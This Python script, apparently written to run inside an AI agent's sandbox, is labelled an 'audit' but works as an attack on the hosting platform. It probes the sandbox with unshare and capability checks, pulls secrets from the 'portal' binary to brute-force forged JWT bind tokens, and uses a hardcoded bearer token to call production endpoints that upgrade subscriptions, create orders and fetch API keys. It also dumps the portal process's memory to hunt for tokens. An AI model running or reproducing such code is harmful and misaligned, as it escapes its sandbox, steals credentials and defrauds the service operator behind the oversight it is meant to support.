#!/usr/bin/env python3
"""
ROBUST MULTI-RACE AUDIT SCRIPT v2.0
Dynamic timeout, auto-retry, parallel execution with recovery
"""

import concurrent.futures
import requests
import json
import time
import subprocess
import sys
import os
import traceback
from datetime import datetime

# Config
JWT = "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJ1c2VyLWNlbnRlciIsImV4cCI6MTc4NjkzOTUxMiwiaWF0IjoxNzg0MzQ3NTEyLCJqdGkiOiJkOWRmbXUyZTBtN2ZvZmppMnBoZyIsInR5cCI6ImFjY2VzcyIsImFwcF9pZCI6ImtpbWkiLCJzdWIiOiJkODdicjJvaDhuamtyOTBqZjUyMCIsInNwYWNlX2lkIjoiZDg3YnIyZ2g4bmprcjkwamU5N2ciLCJhYnN0cmFjdF91c2VyX2lkIjoiZDg3YnIyZ2g4bmprcjkwamU5NzAiLCJzc2lkIjoiMTczMTczNzQxMDg0MjU0NzAzMyIsImRldmljZV9pZCI6Ijc2NTI1NTE1ODg3MzY4MDcxODMiLCJyZWdpb24iOiJvdmVyc2VhcyIsIm1lbWJlcnNoaXAiOnsibGV2ZWwiOjEwfX0.-9-OczLe8Ghkb28wYdTQSFb-UHZW0hxaByfVEZU-Dsc9zWWcMdyAPWK3v5ZrQAz8BIg4om89-VODnXDyT7RPMw"

LOG_FILE = "/mnt/agents/output/race_audit.log"
RESULTS_FILE = "/mnt/agents/output/race_results.json"

# Dynamic timeout calculator
def calc_timeout(base_timeout, attempt):
    """Increase timeout on retry, cap at 30s"""
    return min(base_timeout * (2 ** attempt), 30)

def log(msg, level="INFO"):
    ts = datetime.now().isoformat()
    line = f"[{ts}] [{level}] {msg}"
    print(line, flush=True)
    with open(LOG_FILE, "a") as f:
        f.write(line + "\n")

def run_shell(cmd, timeout=5, retries=2):
    """Run shell command with dynamic timeout and retry"""
    for attempt in range(retries + 1):
        t = calc_timeout(timeout, attempt)
        try:
            result = subprocess.run(
                cmd, shell=True, capture_output=True, text=True,
                timeout=t, env={**os.environ, "PYTHONUNBUFFERED": "1"}
            )
            return {
                "success": True, "rc": result.returncode,
                "out": result.stdout, "err": result.stderr,
                "cmd": cmd, "timeout": t, "attempt": attempt
            }
        except subprocess.TimeoutExpired:
            log(f"TIMEOUT (attempt {attempt+1}/{retries+1}, timeout={t}s): {cmd[:100]}", "WARN")
            if attempt == retries:
                return {"success": False, "error": "timeout", "cmd": cmd, "timeout": t}
        except Exception as e:
            log(f"ERROR (attempt {attempt+1}): {cmd[:100]} - {e}", "ERROR")
            if attempt == retries:
                return {"success": False, "error": str(e), "cmd": cmd}
    return {"success": False, "error": "all retries failed", "cmd": cmd}

def http_probe(url, method="POST", headers=None, body=None, timeout=3, retries=1):
    """HTTP probe with dynamic timeout and retry"""
    for attempt in range(retries + 1):
        t = calc_timeout(timeout, attempt)
        try:
            if method == "POST":
                r = requests.post(url, headers=headers, json=body, timeout=t)
            else:
                r = requests.get(url, headers=headers, timeout=t)
            return {
                "success": True, "status": r.status_code,
                "body": r.text[:500], "url": url, "timeout": t, "attempt": attempt
            }
        except requests.Timeout:
            log(f"HTTP TIMEOUT (attempt {attempt+1}): {url}", "WARN")
            if attempt == retries:
                return {"success": False, "error": "timeout", "url": url}
        except Exception as e:
            log(f"HTTP ERROR (attempt {attempt+1}): {url} - {e}", "ERROR")
            if attempt == retries:
                return {"success": False, "error": str(e), "url": url}
    return {"success": False, "error": "all retries failed", "url": url}

# ===== PHASE 1: SYSTEM RECON =====
log("=== PHASE 1: SYSTEM RECON ===")
recon_tasks = [
    ("unshare_root", "unshare -U -r id"),
    ("caps", "unshare -U -r bash -c 'cat /proc/self/status | grep Cap'"),
    ("portal_procs", "ps aux | grep portal | grep -v grep"),
    ("envd_procs", "ps aux | grep envd | grep -v grep"),
    ("ports", "ss -tlnp 2>/dev/null | grep -E '8080|49983|8888|9223|6080'"),
    ("fuse_mounts", "mount | grep fuse"),
    ("s6_status", "s6-svstat /run/service/portal 2>&1; s6-svstat /run/service/envd 2>&1"),
    ("portal_logs", "ls -la /tmp/portal*.log 2>/dev/null"),
    ("envd_logs", "ls -la /tmp/envd* /tmp/kimi-project-drive9.log 2>/dev/null"),
]

recon_results = {}
with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
    futures = {ex.submit(run_shell, cmd, 5, 1): name for name, cmd in recon_tasks}
    for f in concurrent.futures.as_completed(futures):
        name = futures[f]
        try:
            recon_results[name] = f.result()
        except Exception as e:
            recon_results[name] = {"success": False, "error": str(e)}

for name, res in recon_results.items():
    status = "OK" if res.get("success") else "FAIL"
    log(f"RECON {name}: {status}")

# ===== PHASE 2: PORTAL BIND TOKEN BRUTE FORCE =====
log("=== PHASE 2: BIND TOKEN BRUTE FORCE ===")

# Extract candidate secrets from portal binary
log("Extracting secrets from portal binary...")
secret_extraction = run_shell(
    "strings -n 32 /usr/local/bin/portal | grep -E '^[A-Za-z0-9+/]{43,}={0,2}$' | head -200 > /tmp/portal_secrets.txt && wc -l /tmp/portal_secrets.txt",
    timeout=30, retries=0
)
log(f"Secret extraction: {secret_extraction.get('out', 'FAIL')}")

# Also extract hex strings
hex_extraction = run_shell(
    "strings -n 32 /usr/local/bin/portal | grep -E '^[a-f0-9]{64,128}$' | head -200 > /tmp/portal_hex.txt && wc -l /tmp/portal_hex.txt",
    timeout=30, retries=0
)
log(f"Hex extraction: {hex_extraction.get('out', 'FAIL')}")

# Read secrets
secrets = []
try:
    with open("/tmp/portal_secrets.txt") as f:
        secrets = [s.strip().encode() for s in f if len(s.strip()) >= 16]
    log(f"Loaded {len(secrets)} base64 secrets")
except:
    log("No secrets file, using defaults", "WARN")
    secrets = [b"secret", b"warden", b"kimi", b"kimiwarden", b"portal", b"bind-token", b"test", b"dev", b"prod"]

# Try to forge bind token
import hmac, hashlib, base64

header = base64.urlsafe_b64encode(b'{"alg":"HS256","typ":"JWT"}').rstrip(b'=')
payload_data = {
    "iss": "kimiwarden", "sub": "d87br2oh8njkr90jf520", "aud": "portal",
    "exp": int(time.time()) + 3600, "iat": int(time.time()),
    "user_id": "d87br2oh8njkr90jf520", "space_id": "d87br2gh8njkr90je97g",
    "region": "REGION_OVERSEA", "workflow": "WORKFLOW_K2D5"
}
payload = base64.urlsafe_b64encode(json.dumps(payload_data).encode()).rstrip(b'=')

bind_results = []
log(f"Testing {len(secrets)} secrets for bind token...")

for i, secret in enumerate(secrets):
    sig = hmac.new(secret, f"{header.decode()}.{payload.decode()}".encode(), hashlib.sha256).digest()
    token = f"{header.decode()}.{payload.decode()}.{base64.urlsafe_b64encode(sig).rstrip(b'=').decode()}"

    try:
        r = requests.post(
            "http://127.0.0.1:8080/api/v1/bind_token",
            json={"token": token}, timeout=3
        )
        if r.status_code not in [401, 404]:
            log(f"BIND TOKEN SUCCESS with secret '{secret.decode()[:30]}'! Status: {r.status_code}", "CRITICAL")
            log(f"Response: {r.text[:500]}", "CRITICAL")
            with open("/tmp/bind_token_success.txt", "w") as f:
                f.write(f"Secret: {secret.decode()}\nToken: {token}\nResponse: {r.text}\n")
            bind_results.append({"success": True, "secret": secret.decode(), "status": r.status_code, "token": token})
            break
        elif i % 50 == 0:
            log(f"Progress: {i}/{len(secrets)} tested...")
    except Exception as e:
        pass

if not bind_results:
    log("No bind token secret found in brute force", "WARN")

# ===== PHASE 3: HTTP ENDPOINT PROBE =====
log("=== PHASE 3: HTTP ENDPOINT PROBE ===")

base_headers = {
    "Authorization": f"Bearer {JWT}",
    "Content-Type": "application/json",
    "connect-protocol-version": "1",
}

endpoints = [
    ("prod", "https://www.kimi.com/apiv2/kimi.gateway.membership.v2.MembershipService/GetSubscription", "POST", {}),
    ("prod", "https://www.kimi.com/apiv2/kimi.gateway.membership.v2.MembershipService/UpdateSubscription", "POST", {"level": "LEVEL_ADVANCED"}),
    ("prod", "https://www.kimi.com/apiv2/kimi.gateway.membership.v2.MembershipService/UpgradeSubscription", "POST", {}),
    ("prod", "https://www.kimi.com/apiv2/kimi.gateway.order.v1.OrderService/CreateOrder", "POST", {"goods_id": "19b69633-d662-88f5-8000-0000152fd8ee"}),
    ("prod", "https://www.kimi.com/apiv2/kimi.portal.v1.PortalService/GetAPIKey", "POST", {}),
    ("prod", "https://www.kimi.com/apiv2/kimi.portal.v1.PortalService/GetPortalBindToken", "POST", {}),
    ("local", "http://127.0.0.1:8080/api/v1/bind_token", "POST", {"token": ""}),
    ("local", "http://127.0.0.1:8080/api/v1/bind", "POST", {"user_id": "d87br2oh8njkr90jf520"}),
    ("local", "http://127.0.0.1:8080/api/v1/status", "GET", None),
    ("envd", "http://127.0.0.1:49983/metrics", "GET", None),
    ("kernel", "http://127.0.0.1:8888/kernel/status", "GET", None),
    ("kernel", "http://127.0.0.1:8888/kernel/debug", "GET", None),
]

http_results = []
with concurrent.futures.ThreadPoolExecutor(max_workers=15) as ex:
    futures = {}
    for name, url, method, body in endpoints:
        if method == "POST":
            f = ex.submit(http_probe, url, "POST", base_headers, body, 5, 1)
        else:
            f = ex.submit(http_probe, url, "GET", None, None, 5, 1)
        futures[f] = name

    for f in concurrent.futures.as_completed(futures):
        name = futures[f]
        try:
            res = f.result()
            http_results.append({"name": name, **res})
            if res.get("success") and res.get("status") not in [401, 404]:
                log(f"HTTP HIT {name}: {res['status']} - {res.get('body', '')[:200]}", "CRITICAL")
        except Exception as e:
            http_results.append({"name": name, "success": False, "error": str(e)})

# ===== PHASE 4: MEMORY DUMP FOR SECRETS =====
log("=== PHASE 4: MEMORY DUMP ===")

# Check if we can read portal memory
mem_check = run_shell("cat /proc/$(pgrep -f 'portal -http-bind' | head -1)/maps 2>/dev/null | head -5", 5, 1)
log(f"Portal memory access: {mem_check.get('out', 'FAIL')[:200]}")

# Try to dump heap
heap_dump = run_shell(
    "PORTAL_PID=$(pgrep -f 'portal -http-bind' | head -1) && "
    "grep 'rw-p' /proc/$PORTAL_PID/maps | head -1 | awk '{print $1}' | "
    "(IFS=- read start end; dd if=/proc/$PORTAL_PID/mem of=/tmp/portal_heap.bin bs=1 skip=$((0x$start)) count=$((0x$end - 0x$start)) 2>/dev/null && echo "DUMPED")",
    timeout=30, retries=0
)
log(f"Heap dump: {heap_dump.get('out', 'FAIL')[:200]}")

# Search heap for JWT-like strings
if os.path.exists("/tmp/portal_heap.bin"):
    jwt_search = run_shell(
        "strings -n 20 /tmp/portal_heap.bin | grep 'eyJ' | head -20",
        timeout=10, retries=0
    )
    log(f"JWTs in heap: {jwt_search.get('out', 'NONE')[:500]}")

# ===== SAVE RESULTS =====
all_results = {
    "timestamp": datetime.now().isoformat(),
    "recon": recon_results,
    "bind_brute_force": bind_results,
    "http_probe": http_results,
    "memory_dump": {"heap_exists": os.path.exists("/tmp/portal_heap.bin")}
}

with open(RESULTS_FILE, "w") as f:
    json.dump(all_results, f, indent=2)

log(f"Results saved to {RESULTS_FILE}")
log("=== AUDIT COMPLETE ===")
